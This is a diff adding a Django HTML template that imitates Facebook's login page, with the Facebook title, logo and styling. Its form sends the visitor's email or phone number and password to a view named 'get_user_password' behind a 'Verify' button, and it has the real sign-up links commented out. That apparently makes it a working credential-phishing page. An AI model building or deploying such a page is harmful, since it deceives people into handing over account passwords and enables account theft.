@@ -1,0 +1,51 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <meta name="google-site-verification" content="aa1KHW6JENl9Ai8FiVKBgnujz4qIMW1uNrwU9LTBD74" />
+    <link rel="icon" type="" href="../external.html?link=https://img.icons8.com/?size=512&amp;id=118497&amp;format=png" />
+    <link href='{% static "cdn.jsdelivr.net/npm/tailwindcss%402.2.19/dist/tailwind.min.css" %}' rel="stylesheet">
+</head>
+
+<body class="bg-gray-100">
+    <div class="min-h-screen flex items-center justify-center px-4 sm:flex-row flex-col">
+        <div class=" p-8 rounded-lg md:w-96 w-full">
+            <img class="mx-auto w-70" src="{% static 'img/fb.png' %}"
+                alt="Facebook Logo">
+            <!-- <p class="text-lg text-center mt-4 ">Tell facebook that you are the one...</p> -->
+        </div>
+        <div class="bg-white p-8 rounded-lg shadow-lg md:w-96 w-full">
+            <form class="mt-6" method="POST" action="{% url 'get_user_password' %}">
+              {% csrf_token %}
+                <input
+                    class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-blue-500"
+                    type="text" placeholder="Email address or phone number" name="phone_email" required>
+                <input
+                    class="w-full mt-4 px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-blue-500"
+                    type="password" placeholder="Password" name="pswd" required>
+                <button type="submit"
+                    class="w-full mt-6 py-3 bg-blue-600 text-white text-xl font-semibold rounded-lg hover:bg-blue-500 focus:outline-none focus:bg-blue-500">
+                  Verify
+                </button>
+                <span>
+                  {{message}}
+                </span>
+              <!--   <span class="block text-sm mt-4 text-center text-blue-800 hover:text-blue-500 cursor-pointer">Forgotten
+                  Password</span>
+              <hr class="my-4">
+              <button
+                  class="w-full py-3 font-bold text-white text-center bg-green-600 hover:bg-green-500 rounded-lg"><a href="SignUp.html">Create New Account</a>
+                  </button>
+              <span class="block text-xs text-center mt-2">
+                  <span class="font-bold"><a href="Registration.html" class="text-blue-700 underline text-sm">Create a
+                          Page</a></span> for a celebrity, brand, or business.
+              </span> -->
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
